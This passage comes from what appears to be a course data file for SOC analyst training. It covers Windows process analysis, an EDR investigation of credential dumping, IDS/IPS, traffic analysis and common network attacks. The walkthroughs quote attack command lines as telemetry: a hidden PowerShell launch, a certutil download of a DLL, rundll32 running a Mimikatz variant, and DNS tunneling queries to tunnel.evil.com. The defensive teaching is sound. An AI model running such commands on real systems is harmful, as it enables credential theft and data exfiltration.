svchost.exe     → C:\\Windows\\System32\\

SUSPICIOUS LOCATIONS

powershell.exe  → C:\\Users\\Public\\powershell.exe         [!]
svchost.exe     → C:\\Windows\\Temp\\svchost.exe            [!]
cmd.exe         → C:\\ProgramData\\cmd.exe                  [!]
\`\`\`

### 4. Process Masquerading

Attackers disguise processes:

\`\`\`
LEGITIMATE                          MASQUERADING
svchost.exe                        svch0st.exe (zero instead of 'o')
services.exe                       service.exe (missing 's')
csrss.exe                          cssrs.exe (letters swapped)
lsass.exe                          lsasss.exe (extra 's')
\`\`\`

## Common Attack Techniques

### Living Off the Land (LOLBAS)

Legitimate tools used maliciously:

| Tool | Malicious Use |
|------|---------------|
| certutil.exe | Download files |
| mshta.exe | Execute HTA files |
| regsvr32.exe | Execute scripts |
| rundll32.exe | Execute DLLs |
| wmic.exe | Process execution |
| bitsadmin.exe | Download files |

### Process Injection

Signs of process injection:

\`\`\`
INJECTION INDICATORS

1. Unexpected memory allocations
   └─ VirtualAlloc in remote process

2. Suspicious thread creation
   └─ CreateRemoteThread

3. Normal process with unusual behavior
   └─ notepad.exe making network connections

4. Hollowed processes
   └─ Process image doesn't match on-disk file
\`\`\`

## Baseline Knowledge: Normal Process Behavior

### Critical Windows Processes

\`\`\`
PROCESS: svchost.exe
Normal:
├── Parent: services.exe ONLY
├── Path: C:\\Windows\\System32\\svchost.exe
├── Command: svchost.exe -k [service group]
├── Multiple instances (normal)
Suspicious:
├── Parent other than services.exe
├── Running from wrong path
├── No -k parameter

PROCESS: lsass.exe
Normal:
├── Parent: wininit.exe
├── Path: C:\\Windows\\System32\\lsass.exe
├── Single instance only
├── High integrity level
Suspicious:
├── Multiple instances
├── Wrong parent or path
├── Credential dumping attempts

PROCESS: csrss.exe
Normal:
├── Parent: (no parent - first process)
├── Path: C:\\Windows\\System32\\csrss.exe
├── Session 0 and per user session
Suspicious:
├── Has a visible parent
├── Wrong path
├── Unusual child processes
\`\`\`

## Process Analysis Checklist

\`\`\`
□ Is the process name spelled correctly?
□ Is it running from the expected path?
□ Is the parent process legitimate?
□ Are the command-line arguments suspicious?
□ Is the process signed by a trusted publisher?
□ Is the behavior normal for this process type?
□ Are there network connections that are unusual?
□ Are child processes expected?
\`\`\`
    `,
    keyTakeaways: [
      "Process analysis requires understanding normal parent-child relationships",
      "Office apps spawning scripting engines is a critical red flag",
      "Unusual paths and misspelled names indicate masquerading",
      "LOLBAS techniques use legitimate tools for malicious purposes",
      "Know the normal behavior of critical Windows processes"
    ],
    practicalExercise: {
      title: "Process Tree Analysis",
      description: "Analyze process trees to identify malicious activity.",
      steps: [
        "Review three sample process trees",
        "Identify the parent-child relationship anomalies",
        "Flag suspicious command-line arguments",
        "Determine which processes are masquerading",
        "Write a verdict for each process tree"
      ]
    }
  },
  {
    id: "8.4",
    courseId: "soc-fundamentals",
    title: "Hands-On: EDR Investigation",
    content: `
# Hands-On: EDR Investigation

Let's walk through a complete EDR investigation from alert to resolution.

## Scenario

\`\`\`
ALERT DETAILS

Alert Name: Credential Dumping Attempt Detected
Severity: CRITICAL
Confidence: 95%
Timestamp: 2024-01-15 02:34:17 UTC
Hostname: DC-PRIMARY
Username: SYSTEM
MITRE ATT&CK: T1003.001 - LSASS Memory Dumping

Detection: Process accessed LSASS memory with suspicious pattern
Process: rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
\`\`\`

## Step 1: Initial Assessment

### Alert Context

\`\`\`
CRITICAL FACTORS:
☑ Domain Controller - highest value target
☑ LSASS access - credential theft technique
☑ Unusual DLL location (Windows\\Temp)
☑ Running as SYSTEM - high privileges
☑ 2:34 AM - outside business hours

VERDICT: High priority, investigate immediately
\`\`\`

## Step 2: Process Tree Analysis

\`\`\`
PROCESS TREE

winlogon.exe (PID 512)
└── services.exe (PID 624)
    └── svchost.exe -k netsvcs (PID 892)
        └── WmiPrvSE.exe (PID 2048)          [1] WMI activity
            └── powershell.exe (PID 3156)    [2] PS execution
                └── cmd.exe (PID 3892)        [3] cmd child
                    └── rundll32.exe (PID 4212)[4] LSASS access

ANALYSIS:
[1] WmiPrvSE.exe - WMI can be used for remote execution
[2] PowerShell spawned from WMI - suspicious!
[3] cmd.exe child - executing commands
[4] rundll32.exe - the credential dumping attempt
\`\`\`

### Command Line Details

\`\`\`
[PID 2048] WmiPrvSE.exe
Command: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding
Analysis: WMI host process, can be abused for remote execution

[PID 3156] powershell.exe
Command: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX..."
Analysis: 
  • -NoP = No Profile
  • -NonI = Non-Interactive
  • -W Hidden = Hidden Window
  • -Exec Bypass = Bypass execution policy
  • ALL are evasion flags!

[PID 3892] cmd.exe
Command: cmd.exe /c certutil -urlcache -f http://10.0.1.50/debug.dll C:\\Windows\\Temp\\debug.dll
Analysis: Downloaded malicious DLL using certutil (LOLBAS)

[PID 4212] rundll32.exe
Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
Analysis: Executed downloaded DLL
\`\`\`

## Step 3: Network Analysis

\`\`\`
NETWORK CONNECTIONS

[PID 3892] 02:34:05 UTC
Protocol: HTTP
Destination: 10.0.1.50:80
File Downloaded: debug.dll (245KB)

WHOIS/LOOKUP: 10.0.1.50
└── Internal IP - likely compromised internal system
└── Hostname: WORKSTATION-42

CONCLUSION: Attack originated from internal host
\`\`\`

## Step 4: File Analysis

\`\`\`
FILE: C:\\Windows\\Temp\\debug.dll

Properties:
├── Size: 245,760 bytes
├── Created: 2024-01-15 02:34:05 UTC
├── Hash: SHA256 7e8f9a0b1c2d3e4f...
├── Signature: UNSIGNED
└── VirusTotal: 45/70 detections

Detection Names:
├── Mimikatz variant
├── Credential stealer
├── HackTool:Win64/Mikatz

VERDICT: Confirmed malicious - Mimikatz credential dumper
\`\`\`

## Step 5: Impact Assessment

\`\`\`
LSASS ACCESS ANALYSIS

Memory regions accessed:
└── Credential storage regions

Potential impact:
☑ All domain credentials at risk
☑ Password hashes exposed
☑ Kerberos tickets compromised
☑ Golden ticket possible

AFFECTED ACCOUNTS:
├── Domain Admins
├── Service accounts
├── Recently logged-in users
└── All cached credentials
\`\`\`

## Step 6: Attack Timeline

\`\`\`
TIMELINE RECONSTRUCTION

01:15:23 - Attacker compromises WORKSTATION-42 (initial access)
02:30:45 - WMI used for lateral movement to DC-PRIMARY
02:33:12 - PowerShell downloads attack tools
02:34:05 - Certutil downloads Mimikatz variant
02:34:15 - DLL executed via rundll32
02:34:17 - LSASS memory accessed (DETECTION)
02:34:45 - EDR terminates process (automatic response)

DWELL TIME: Approximately 1 hour 15 minutes
\`\`\`

## Step 7: Containment Actions

\`\`\`
IMMEDIATE ACTIONS TAKEN

[02:35:00] EDR Automatic Response
☑ Killed rundll32.exe process
☑ Quarantined debug.dll
☑ Alert generated

[02:40:00] SOC Response
☑ Isolated DC-PRIMARY from network
☑ Isolated WORKSTATION-42 (source)
☑ Notified IR team lead
☑ Initiated password reset for domain admins

[02:55:00] IR Team Actions
☑ Memory dump collected from DC
☑ Forensic imaging initiated
☑ krbtgt password reset scheduled
\`\`\`

## Step 8: Documentation

\`\`\`
INCIDENT SUMMARY

Ticket: INC-2024-0023
Severity: CRITICAL (1)
Category: Credential Theft - Mimikatz

Attack Chain:
1. Initial compromise of WORKSTATION-42 (unknown vector)
2. Lateral movement to DC-PRIMARY via WMI
3. Mimikatz variant downloaded and executed
4. LSASS memory accessed for credential dumping

Impact:
- Domain credentials likely compromised
- Full domain compromise possible

Containment:
- Both systems isolated
- Attack process terminated
- Malicious DLL quarantined

Required Actions:
- Reset all domain admin passwords
- Reset krbtgt password (twice, 10 hours apart)
- Investigate WORKSTATION-42 for initial vector
- Forest-wide credential reset recommended
\`\`\`

## Lessons Learned

**What EDR Did Well:**
- Detected LSASS access in real-time
- Automatically terminated the attack
- Provided full visibility into attack chain

**Investigation Key Points:**
- Process tree revealed lateral movement path
- Command line analysis showed evasion techniques
- Network data identified internal source
- File analysis confirmed Mimikatz
    `,
    keyTakeaways: [
      "EDR provides the telemetry needed to reconstruct attack chains",
      "Process trees reveal lateral movement and attack progression",
      "Command line analysis exposes evasion techniques",
      "LSASS access on domain controllers is a critical security event",
      "Credential theft on DCs may require forest-wide password resets"
    ],
    practicalExercise: {
      title: "EDR Investigation Scenario",
      description: "Work through an EDR alert investigation independently.",
      steps: [
        "Review the provided EDR alert and telemetry",
        "Build the process tree from the data",
        "Analyze command lines for suspicious indicators",
        "Check network connections and file operations",
        "Document your findings and recommend actions"
      ]
    }
  },

  // =========================================
  // MODULE 9: NETWORK SECURITY MONITORING
  // =========================================
  {
    id: "9.1",
    courseId: "soc-fundamentals",
    title: "Network Security Fundamentals",
    content: `
# Network Security Fundamentals

Understanding network basics is essential for SOC analysts who monitor and investigate network-based threats.

## The OSI Model for Security

\`\`\`
Layer 7 - Application   │ HTTP, DNS, SMTP         │ Web attacks, malware C2
Layer 6 - Presentation  │ SSL/TLS, encryption     │ Cert issues, downgrade attacks
Layer 5 - Session       │ Sessions, auth          │ Session hijacking
Layer 4 - Transport     │ TCP, UDP                │ Port scans, SYN floods
Layer 3 - Network       │ IP, ICMP, routing       │ IP spoofing, DDoS
Layer 2 - Data Link     │ MAC, switches           │ ARP poisoning, MAC spoofing
Layer 1 - Physical      │ Cables, signals         │ Physical access, tapping
\`\`\`

## Key Protocols for SOC Analysts

### TCP/IP Basics

\`\`\`
TCP THREE-WAY HANDSHAKE

Client                    Server
  │                         │
  │ ────── SYN ──────────→ │  "Can we connect?"
  │                         │
  │ ←───── SYN-ACK ─────── │  "Yes, let's connect"
  │                         │
  │ ────── ACK ──────────→ │  "Great, we're connected"
  │                         │
  │ ←───── DATA ──────────→│  (Communication)

SECURITY RELEVANCE:
• SYN flood = Many SYN, no ACK (DoS attack)
• Half-open connections = SYN scan (recon)
• Unusual flags = Evasion or crafted packets
\`\`\`

### Common Ports to Know

| Port | Protocol | Service | Security Relevance |
|------|----------|---------|-------------------|
| 21 | TCP | FTP | File exfiltration |
| 22 | TCP | SSH | Remote access |
| 23 | TCP | Telnet | Legacy, unencrypted |
| 25 | TCP | SMTP | Email, spam |
| 53 | UDP/TCP | DNS | C2, tunneling |
| 80 | TCP | HTTP | Web traffic |
| 443 | TCP | HTTPS | Encrypted web |
| 445 | TCP | SMB | Lateral movement |
| 3389 | TCP | RDP | Remote desktop |
| 8080 | TCP | HTTP Proxy | Alt web ports |

### DNS Fundamentals

\`\`\`
DNS QUERY FLOW

User types: www.example.com
     │
     ↓
┌─────────────────┐
│ Local Resolver  │ ← Check cache first
└────────┬────────┘
         │ (if not cached)
         ↓
┌─────────────────┐
│ Root DNS (.com) │
└────────┬────────┘
         ↓
┌─────────────────┐
│ TLD DNS         │ 
└────────┬────────┘
         ↓
┌─────────────────┐
│ Authoritative   │ ← Returns IP: 93.184.216.34
└─────────────────┘

SECURITY USES:
• Malware domains → C2 communication
• DNS tunneling → Data exfiltration
• DGA domains → Botnet communication
• DNS poisoning → Redirect to malicious sites
\`\`\`

## Network Security Devices

### Firewall

\`\`\`
FIREWALL FUNCTION

Internet ←→ [FIREWALL] ←→ Internal Network

Types:
├── Packet Filter: IP/port based rules
├── Stateful: Tracks connection state
├── Next-Gen (NGFW): Application awareness, IPS
└── WAF: Web application specific

What SOC Sees:
• Allowed/denied connections
• Source/destination IPs and ports
• Protocol violations
• Policy violations
\`\`\`

### IDS/IPS

\`\`\`
IDS vs IPS

IDS (Detection):
└── Monitors traffic passively
└── Generates alerts only
└── "Alarm system"

IPS (Prevention):
└── Sits inline with traffic
└── Can block malicious traffic
└── "Security guard"

Detection Methods:
├── Signature-based: Known attack patterns
├── Anomaly-based: Deviation from baseline
└── Behavioral: Suspicious behavior patterns
\`\`\`

### Proxy/Web Gateway

\`\`\`
PROXY VISIBILITY

User → [PROXY] → Internet

What SOC Sees:
├── Full URLs visited
├── User attribution
├── File downloads
├── Blocked categories
├── SSL inspection (if enabled)
└── Malware downloads
\`\`\`

## Network Segmentation

\`\`\`
NETWORK ZONES

┌─────────────────────────────────────────────────────────┐
│                     INTERNET                             │
└───────────────────────┬─────────────────────────────────┘
                        │
                 [Perimeter FW]
                        │
┌───────────────────────┴─────────────────────────────────┐
│                      DMZ                                 │
│   Web Servers   │   Mail Gateway   │   VPN Endpoint     │
└───────────────────────┬─────────────────────────────────┘
                        │
                 [Internal FW]
                        │
┌───────────────────────┴─────────────────────────────────┐
│                   INTERNAL NETWORK                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
│  │ User VLAN   │  │ Server VLAN │  │ Management VLAN │  │
│  │ 10.0.1.0/24 │  │ 10.0.2.0/24 │  │  10.0.99.0/24   │  │
│  └─────────────┘  └─────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────┘

SECURITY PRINCIPLE:
Limit lateral movement between zones
\`\`\`

## Network Logging Sources

### Key Logs for SOC

| Source | Information Provided |
|--------|---------------------|
| Firewall | Connections allowed/denied, NAT |
| IDS/IPS | Threat detections, signatures matched |
| Proxy | URLs, user activity, downloads |
| DNS | Domain lookups, resolution |
| DHCP | IP assignments, MAC addresses |
| NetFlow | Traffic volume, connection metadata |
| VPN | Remote access sessions |
    `,
    keyTakeaways: [
      "The OSI model helps organize understanding of network attacks",
      "Know common ports and their security implications",
      "DNS is heavily abused for C2, tunneling, and malicious redirects",
      "Firewalls, IDS/IPS, and proxies provide key visibility points",
      "Network segmentation limits lateral movement during attacks"
    ],
    additionalResources: [
      { title: "TCP/IP Guide", type: "documentation", url: "http://www.tcpipguide.com" },
      { title: "Wireshark Documentation", type: "tool", url: "https://www.wireshark.org/docs/" }
    ]
  },
  {
    id: "9.2",
    courseId: "soc-fundamentals",
    title: "IDS/IPS Basics",
    content: `
# IDS/IPS Basics

Intrusion Detection and Prevention Systems are critical network security tools that SOC analysts interact with daily.

## Understanding IDS vs IPS

\`\`\`
IDS (Intrusion Detection System)
├── Passive monitoring
├── Alerts only, no blocking
├── Connected via SPAN/TAP
├── No impact on network latency
└── "Alarm system"

IPS (Intrusion Prevention System)
├── Active inline deployment
├── Can block/drop malicious traffic
├── Must handle traffic in real-time
├── Can impact latency if overloaded
└── "Security guard"
\`\`\`

## Detection Methods

### Signature-Based Detection

\`\`\`
HOW IT WORKS:
Known attack pattern → Rule created → Traffic matched → Alert

EXAMPLE SNORT RULE:
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 
(msg:"ET EXPLOIT MS17-010 SMB Remote Code Execution"; 
 content:"|00 00 00|"; depth:3; 
 content:"|ff|SMB"; within:5;
 sid:2024217; rev:1;)

BREAKDOWN:
• alert tcp: Generate alert for TCP traffic
• $EXTERNAL_NET any: From any external IP/port
• $HOME_NET 445: To internal network, SMB port
• content: Specific bytes to match
• msg: Description of what was detected

STRENGTHS:
✓ Low false positives for known threats
✓ Fast matching
✓ Easy to understand

WEAKNESSES:
✗ Cannot detect unknown attacks
✗ Evasion via encoding/encryption
✗ Requires constant updates
\`\`\`

### Anomaly-Based Detection

\`\`\`
HOW IT WORKS:
Learn baseline → Monitor for deviation → Alert on anomalies

EXAMPLE BASELINE:
Normal DNS queries: 50-200/hour
Normal query length: 15-50 characters
Normal TTL requests: Standard values

ANOMALY DETECTED:
DNS queries: 5,000/hour          [!] Volume spike
Query length: 150+ characters    [!] DNS tunneling?
Unusual TXT record requests      [!] Data exfiltration?

STRENGTHS:
✓ Can detect unknown attacks
✓ Catches behavioral changes
✓ Good for insider threats

WEAKNESSES:
✗ Higher false positive rate
✗ Requires learning period
✗ Baseline can drift
\`\`\`

## Common IDS/IPS Solutions

| Solution | Type | Key Features |
|----------|------|--------------|
| Snort | Open Source | Signature-based, widely used |
| Suricata | Open Source | Multi-threaded, high performance |
| Zeek (Bro) | Open Source | Network analysis framework |
| Palo Alto | Commercial | NGFW with IPS capabilities |
| Cisco Firepower | Commercial | Enterprise IPS |

## Understanding IDS Alerts

### Alert Anatomy

\`\`\`
IDS ALERT EXAMPLE

Timestamp: 2024-01-15 14:32:45 UTC
Signature: ET MALWARE Win32/Emotet CnC Checkin
SID: 2024892
Priority: 1 (High)
Source: 10.0.1.108:49822
Destination: 185.234.218.45:443
Protocol: TCP

Raw Packet:
[Hex dump of matching traffic]

Classification: A Network Trojan was detected
\`\`\`

### Alert Priorities

\`\`\`
PRIORITY LEVELS

Priority 1: High Severity
├── Active exploitation attempts
├── Known malware communication
├── Critical vulnerabilities

Priority 2: Medium Severity
├── Suspicious activity
├── Policy violations
├── Potential threats

Priority 3: Low Severity
├── Informational alerts
├── Reconnaissance activity
├── Minor policy violations
\`\`\`

## Alert Triage Process

\`\`\`
IDS ALERT TRIAGE WORKFLOW

1. READ THE ALERT
   └─ What signature fired?
   └─ What classification?
   └─ Source and destination?

2. VALIDATE THE ALERT
   └─ Is the signature relevant?
   └─ Is the target vulnerable?
   └─ Is this expected behavior?

3. INVESTIGATE
   └─ Check source IP reputation
   └─ Review related traffic
   └─ Examine packet content

4. CORRELATE
   └─ Other alerts from same source?
   └─ EDR alerts on destination?
   └─ Similar activity elsewhere?

5. VERDICT
   └─ True Positive → Respond
   └─ False Positive → Document/Tune
   └─ Needs more info → Investigate further
\`\`\`

## Common False Positive Scenarios

\`\`\`
FREQUENT FALSE POSITIVES

1. Vulnerability Scanners
   └─ Internal security tools triggering exploit signatures
   └─ Solution: Whitelist scanner IPs

2. Penetration Testing
   └─ Authorized testing looks like attacks
   └─ Solution: Scheduled testing windows, whitelist

3. Legitimate Software
   └─ Some apps use techniques that look suspicious
   └─ Solution: Application baseline, exceptions

4. Encrypted Traffic
   └─ Partial signature matches in encrypted data
   └─ Solution: Context-aware tuning

5. Generic Signatures
   └─ Overly broad detection patterns
   └─ Solution: Threshold adjustments, refinement
\`\`\`

## Tuning Best Practices

\`\`\`
TUNING APPROACH

DON'T: Disable rules that cause false positives
DO: Tune with specific exceptions

Example:
Before: Rule fires on all traffic to port 445
After: Rule excludes traffic from file servers to expected destinations

DOCUMENTATION:
• Why was tuning needed?
• What was the false positive?
• What exception was created?
• Who approved the change?
\`\`\`
    `,
    keyTakeaways: [
      "IDS monitors and alerts; IPS can actively block threats",
      "Signature-based detection is fast but only catches known threats",
      "Anomaly-based detection can find unknown attacks but has more false positives",
      "Alert triage requires validating relevance and investigating context",
      "Tuning should create specific exceptions, not disable rules entirely"
    ],
    practicalExercise: {
      title: "IDS Alert Analysis",
      description: "Analyze IDS alerts and determine if they are true or false positives.",
      steps: [
        "Review 5 sample IDS alerts",
        "Research each signature to understand what it detects",
        "Analyze source/destination context for each alert",
        "Classify each as true positive, false positive, or needs investigation",
        "Suggest tuning for false positive scenarios"
      ]
    }
  },
  {
    id: "9.3",
    courseId: "soc-fundamentals",
    title: "Network Traffic Analysis",
    content: `
# Network Traffic Analysis

Network traffic analysis involves examining network data to detect and investigate security threats. This skill is essential for SOC analysts.

## Types of Network Data

### 1. Packet Captures (PCAP)

\`\`\`
PCAP = Full packet capture

Contains:
├── Complete packet headers
├── Full payload data
├── Timing information
└── All protocol details

Use Cases:
├── Deep packet inspection
├── Malware analysis
├── Forensic investigation
└── Protocol analysis

Challenges:
├── Large storage requirements
├── Privacy concerns (full content)
├── Performance impact
└── Encryption limits visibility
\`\`\`

### 2. NetFlow/IPFIX

\`\`\`
NETFLOW = Connection metadata

Contains:
├── Source/Destination IP
├── Source/Destination Port
├── Protocol
├── Byte/Packet counts
├── Timestamps
└── Flags

Does NOT Contain:
├── Payload data
├── Application content
└── File transfers

Use Cases:
├── Traffic volume analysis
├── Baseline establishment
├── Anomaly detection
├── Connection tracking
\`\`\`

### 3. DNS Logs

\`\`\`
DNS LOGS

Query:  timestamp | client_ip | query_name | query_type
Response: timestamp | query_name | response_ip | TTL

Security Analysis:
├── Known malicious domains
├── DGA pattern detection
├── DNS tunneling
├── Fast flux networks
└── Typosquatting
\`\`\`

## Traffic Analysis Techniques

### Baseline Comparison

\`\`\`
ESTABLISHING BASELINES

Step 1: Collect normal traffic patterns
- Time of day variations
- Day of week patterns
- Seasonal variations

Step 2: Define thresholds
- Volume: Normal 10GB/day, Alert at 15GB+
- Connections: Normal 5,000/hour, Alert at 10,000+
- Countries: Normal US/EU, Alert on unexpected geolocations

Step 3: Alert on deviations
- Volume spikes: Possible exfiltration
- Connection spikes: Possible DDoS or scanning
- New destinations: Possible C2
\`\`\`

### Beaconing Detection

\`\`\`
BEACONING PATTERN

Malware often "phones home" at regular intervals:

Timeline visualization:
|----|----|----|----|----|----|----|----|  (Regular intervals)
 15m  15m  15m  15m  15m  15m  15m  15m

Detection Indicators:
├── Regular time intervals (with slight jitter)
├── Similar packet sizes
├── Persistent over long periods
├── Often to unusual destinations
└── May be encrypted (HTTPS)

Analysis Query (conceptual):
GROUP connections BY destination
CALCULATE interval_stddev
WHERE interval_stddev < threshold
AND connection_count > minimum
→ Potential beaconing behavior
\`\`\`

### Data Exfiltration Indicators

\`\`\`
EXFILTRATION RED FLAGS

Volume Anomalies:
├── Large uploads to unknown destinations
├── Unusual outbound traffic spikes
├── After-hours data transfers
└── Compressed/encrypted file transfers

Protocol Anomalies:
├── DNS with large TXT responses
├── ICMP with unexpected payload sizes
├── HTTP POST with large bodies
└── Unusual protocol on standard ports

Destination Anomalies:
├── Personal cloud storage
├── New external IPs
├── Tor exit nodes
└── VPN/proxy services
\`\`\`

## Practical Analysis Examples

### Example 1: Suspicious HTTP Traffic

\`\`\`
SCENARIO:
Host 10.0.1.108 making HTTP requests to 185.234.218.45

ANALYSIS:

GET /gate.php?data=aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= HTTP/1.1
Host: 185.234.218.45
User-Agent: Mozilla/5.0

OBSERVATIONS:
1. Direct IP access (no domain) → Suspicious
2. "gate.php" → Common malware endpoint name
3. Base64 data in URL → Data exfiltration
4. Regular interval requests → Beaconing

DECODE BASE64:
aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= 
→ hostname=WORKSTATION-08

VERDICT: Likely malware C2 communication
\`\`\`

### Example 2: DNS Tunneling

\`\`\`
SCENARIO:
High volume of DNS queries to *.tunnel.evil.com

SAMPLE QUERIES:
aGVsbG8gd29ybGQ.tunnel.evil.com
dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com
ZXhmaWx0cmF0ZWQgZGF0YQ.tunnel.evil.com

OBSERVATIONS:
1. Subdomain looks like Base64 → Data encoding
2. High query volume → More than normal DNS
3. All to same parent domain → C2 infrastructure
4. Query length > 50 chars → Unusual for normal DNS

DECODE SUBDOMAINS:
aGVsbG8gd29ybGQ → "hello world"
dGhpcyBpcyBhIHRlc3Q → "this is a test"
ZXhmaWx0cmF0ZWQgZGF0YQ → "exfiltrated data"

VERDICT: DNS tunneling for data exfiltration
\`\`\`

### Example 3: Port Scanning

\`\`\`
SCENARIO:
Single source connecting to many destinations on same port

NETFLOW DATA:
10.0.1.50 → 10.0.1.1:22   1 packet
10.0.1.50 → 10.0.1.2:22   1 packet
10.0.1.50 → 10.0.1.3:22   1 packet
... (continues for entire subnet)

OBSERVATIONS:
1. Sequential IP targets
2. Same port (22 = SSH)
3. Single packet per host → SYN scan
4. Very short duration

VERDICT: Internal port scan, likely reconnaissance
\`\`\`

## Network Analysis Checklist

\`\`\`
□ What's the communication pattern (volume, timing)?
□ Is the destination IP/domain known good, bad, or unknown?
□ What protocol is being used? Is it normal for that port?
□ What's in the payload (if available)?
□ Does this match known C2 patterns?
□ Is there beaconing behavior?
□ Are there related alerts from other sources?
\`\`\`
    `,
    keyTakeaways: [
      "Network data includes PCAPs (full content), NetFlow (metadata), and logs",
      "Baseline comparison helps identify anomalous traffic patterns",
      "Beaconing shows regular-interval callbacks typical of malware C2",
      "DNS tunneling uses encoded data in subdomain names",
      "Port scanning shows single source probing many targets"
    ],
    practicalExercise: {
      title: "Network Traffic Investigation",
      description: "Analyze network traffic samples to identify malicious activity.",
      steps: [
        "Review the provided NetFlow data summary",
        "Identify any beaconing patterns",
        "Analyze the DNS query log for anomalies",
        "Examine the HTTP requests for suspicious indicators",
        "Document your findings and conclusions"
      ]
    }
  },
  {
    id: "9.4",
    courseId: "soc-fundamentals",
    title: "Common Network Attacks",
    content: `
# Common Network Attacks

Understanding how attackers operate on networks helps SOC analysts recognize and respond to threats effectively.

## Reconnaissance Attacks

### Port Scanning

\`\`\`
SCAN TYPES

SYN Scan (Half-Open):
├── Send SYN packet
├── Open port: SYN-ACK response
├── Closed port: RST response
├── Stealthy, doesn't complete connection
└── Detection: Many SYN packets, few ACKs

Connect Scan:
├── Completes full TCP handshake
├── More detectable (logged connections)
└── Detection: Short-lived connections to many ports

UDP Scan:
├── Send UDP packet
├── Open: Response or no response
├── Closed: ICMP port unreachable
└── Detection: ICMP unreachable messages

DETECTION EXAMPLE:
Source 10.0.1.50 connected to:
- 10.0.2.1 ports: 22,80,443,445,3389
- 10.0.2.2 ports: 22,80,443,445,3389
- 10.0.2.3 ports: 22,80,443,445,3389

Pattern: Same source, multiple targets, multiple ports
\`\`\`

### Network Mapping

\`\`\`
NETWORK DISCOVERY TECHNIQUES

ICMP Sweep:
└── Ping all IPs in range
└── Map which hosts are alive

ARP Discovery:
└── ARP who-has for IP range
└── Works on local network

Service Fingerprinting:
└── Identify services and versions
└── Helps find vulnerable systems
\`\`\`

## Command and Control (C2)

### C2 Communication Patterns

\`\`\`
COMMON C2 METHODS

HTTP/HTTPS Beaconing:
├── Regular interval callbacks
├── GET requests with encoded data
├── POST for commands/exfiltration
├── Often mimics legitimate traffic

DNS C2:
├── Commands encoded in DNS queries
├── Responses in TXT/CNAME records
├── Evades web proxies
└── Low bandwidth but stealthy

Domain Generation Algorithms (DGA):
├── Malware generates random domain names
├── C2 registers some of them
├── Hard to block all possibilities
└── Detection: High NXDomain responses, entropy analysis
\`\`\`

### C2 Detection Indicators

\`\`\`
RED FLAGS FOR C2

Beaconing Behavior:
☑ Regular interval connections (15min, 30min, etc.)
☑ Consistent packet sizes
☑ Persistent over hours/days
☑ To same destination

Traffic Anomalies:
☑ Encrypted traffic to unusual destinations
☑ Non-standard ports for protocols
☑ Mismatched application headers
☑ Large volumes of DNS TXT queries

Destination Indicators:
☑ Recently registered domains
☑ DGA-looking domain names
☑ Bulletproof hosting providers
☑ Tor exit nodes
\`\`\`

## Lateral Movement

### SMB-Based Movement

\`\`\`
SMB ATTACK TECHNIQUES

PsExec/Remote Execution:
├── Creates service on remote host
├── Executes payload
├── Uses SMB port 445
└── Detection: Event ID 7045, remote service creation

Pass-the-Hash:
├── Stolen NTLM hash used for auth
├── No password needed
├── Works with SMB, WMI, etc.
└── Detection: Unusual auth patterns, Event ID 4624 Type 3

SMB Shares:
├── Map administrative shares (C$, ADMIN$)
├── Copy tools/malware
├── Execute remotely
└── Detection: Unusual share access, file copies
\`\`\`

### WMI and PowerShell Remoting

\`\`\`
REMOTE EXECUTION METHODS

WMI (Windows Management Instrumentation):
├── Creates process on remote host
├── Port 135 (RPC) + dynamic ports
├── Detection: WmiPrvSE.exe spawning processes

PowerShell Remoting:
├── Port 5985 (HTTP) or 5986 (HTTPS)
├── Full PowerShell capabilities remotely
├── Detection: wsmprovhost.exe, Event ID 4103/4104

RDP (Remote Desktop):
├── Port 3389
├── Interactive session
├── Detection: Event ID 4624 Type 10
\`\`\`

## Data Exfiltration

### Exfiltration Techniques

\`\`\`
EXFILTRATION METHODS

Direct Upload:
├── FTP, SFTP, SCP
├── Cloud storage (Dropbox, GDrive)
├── File sharing services
└── Detection: Large outbound transfers

Protocol Tunneling:
├── DNS tunneling (data in queries)
├── ICMP tunneling (data in ping)
├── HTTP tunneling (data in requests)
└── Detection: Protocol anomalies

Covert Channels:
├── Steganography (data in images)
├── Encrypted containers
├── Custom protocols on standard ports
└── Detection: Baseline deviation
\`\`\`

### Detection Strategies

\`\`\`
EXFILTRATION DETECTION

Volume-Based:
├── Large outbound data volumes
├── Unusual upload/download ratios
├── After-hours transfers
└── Compressed file uploads

Destination-Based:
├── Personal cloud storage
├── Unknown external hosts
├── Newly registered domains
├── Known file sharing sites

Content-Based (DLP):
├── Sensitive data patterns
├── Document classifications
├── PII/PHI detection
└── Source code markers
\`\`\`

## Attack Detection Summary

\`\`\`
NETWORK ATTACK INDICATORS CHEAT SHEET

Reconnaissance:
• Port scans: Single source, many targets/ports
• Host discovery: ICMP sweep, ARP requests

C2 Communication:
• Beaconing: Regular intervals, same destination
• DNS C2: Long queries, TXT records, high NXDomain
• DGA: Random-looking domains, high entropy

Lateral Movement:
• SMB: Port 445, unusual access to shares
• WMI: Port 135, WmiPrvSE spawning processes
• RDP: Port 3389, unusual login patterns

Exfiltration:
• Volume: Large outbound transfers
• Protocols: DNS tunneling, ICMP anomalies
• Destinations: Cloud storage, unknown hosts
\`\`\`
    `,
    keyTakeaways: [
      "Port scanning shows single source connecting to many targets/ports",
      "C2 traffic often exhibits beaconing patterns with regular intervals",
      "Lateral movement uses SMB, WMI, PowerShell Remoting, and RDP",
      "Exfiltration can use direct uploads, protocol tunneling, or covert channels",
      "Baseline knowledge is essential for detecting anomalous activity"
    ],
    practicalExercise: {
      title: "Attack Pattern Recognition",
      description: "Identify attack patterns in sample network data.",
      steps: [
        "Review the network traffic samples provided",
        "Identify any reconnaissance activity",
        "Look for C2 communication patterns",
        "Find evidence of lateral movement",
        "Detect any data exfiltration indicators"
      ]
    }
  },

  // =========================================
  // MODULE 10: SOC ANALYST BEST PRACTICES
  // =========================================
  {
    id: "10.1",
    courseId: "soc-fundamentals",
    title: "Building Investigation Skills",
    content: `
# Building Investigation Skills

Becoming an effective SOC analyst requires developing strong analytical and investigation skills beyond just technical knowledge.

## The Analytical Mindset

